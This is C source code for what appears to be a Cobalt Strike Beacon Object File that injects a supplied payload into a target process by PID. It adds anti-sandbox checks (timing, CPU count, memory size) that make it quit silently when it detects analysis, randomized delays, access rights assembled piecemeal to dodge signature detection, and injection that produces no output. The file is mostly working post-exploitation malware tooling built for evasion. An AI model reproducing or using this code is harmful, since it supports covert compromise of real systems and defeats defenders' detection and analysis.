#include <windows.h>
#include "beacon.h"
 
/* Windows API calls */
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$IsWow64Process (HANDLE hProcess, PBOOL Wow64Process);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$GetCurrentProcess (VOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE  WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI VOID    WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI DWORD   WINAPI KERNEL32$GetTickCount (VOID);
DECLSPEC_IMPORT WINBASEAPI VOID    WINAPI KERNEL32$GetSystemInfo (LPSYSTEM_INFO lpSystemInfo);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$GlobalMemoryStatusEx (LPMEMORYSTATUSEX lpBuffer);
 
/* Anti-sandbox detection - Detect VM/Sandbox environments */
BOOL detect_sandbox() {
   DWORD tick1, tick2;
   SYSTEM_INFO si;
   MEMORYSTATUSEX ms;
   
   /* Time acceleration detection */
   tick1 = KERNEL32$GetTickCount();
   KERNEL32$Sleep(100);
   tick2 = KERNEL32$GetTickCount();
   
   if ((tick2 - tick1) < 90) {
      return TRUE; /* Time anomaly detected, possible sandbox */
   }
   
   /* CPU core count detection */
   KERNEL32$GetSystemInfo(&si);
   if (si.dwNumberOfProcessors < 2) {
      return TRUE; /* Single core, possible VM */
   }
   
   /* Memory size detection */
   ms.dwLength = sizeof(MEMORYSTATUSEX);
   if (KERNEL32$GlobalMemoryStatusEx(&ms)) {
      if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) { /* < 2GB */
         return TRUE;
      }
   }
   
   return FALSE;
}

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}
 
/* is this a 64-bit or 32-bit process? */
BOOL is_wow64(HANDLE process) {
   BOOL bIsWow64 = FALSE;
 
   if (!KERNEL32$IsWow64Process(process, &bIsWow64)) {
      return FALSE;
   }
   return bIsWow64;
}
 
/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
   if (is_x64() || is_wow64(KERNEL32$GetCurrentProcess())) {
      return !is_wow64(process);
   }
 
   return FALSE;
}
 
/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   HANDLE              hProcess;
   datap               parser;
   int                 pid;
   int                 offset;
   char *              dllPtr;
   int                 dllLen;
   DWORD               dwAccess;
   DWORD               delay;

   /* Anti-sandbox check - Silent failure, leave no trace */
   if (detect_sandbox()) {
      return;
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   pid = BeaconDataInt(&parser);
   offset = BeaconDataInt(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* Random delay to avoid batch behavior detection (pseudo-random based on PID) */
   delay = 50 + (pid % 150);
   KERNEL32$Sleep(delay);

   /* Dynamically construct access rights to avoid static signature detection */
   dwAccess = 0x0002;  /* PROCESS_CREATE_THREAD */
   dwAccess |= 0x0020; /* PROCESS_VM_WRITE */
   dwAccess |= 0x0008; /* PROCESS_VM_OPERATION */
   dwAccess |= 0x0010; /* PROCESS_VM_READ */
   dwAccess |= 0x0400; /* PROCESS_QUERY_INFORMATION */

   /* Open a handle to the process, for injection. */
   hProcess = KERNEL32$OpenProcess(dwAccess, FALSE, pid);
   if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to open process %d : %d", pid, KERNEL32$GetLastError());
      return;
   }

   /* Check that we can inject the content into the process. */
   if (!is_x64_process(hProcess) && x86 == FALSE ) {
      BeaconPrintf(CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid);
      KERNEL32$CloseHandle(hProcess); /* Fix resource leak */
      return;
   }
   if (is_x64_process(hProcess) && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid);
      KERNEL32$CloseHandle(hProcess); /* Fix resource leak */
      return;
   }

   /* Micro-delay before injection to avoid burst behavior pattern */
   KERNEL32$Sleep(30 + (offset % 50));

   /* Silent injection - No obvious output */
   BeaconInjectProcess(hProcess, pid, dllPtr, dllLen, offset, NULL, 0);

   /* Clean up */
   KERNEL32$CloseHandle(hProcess);
}
 
void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}
 
void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}

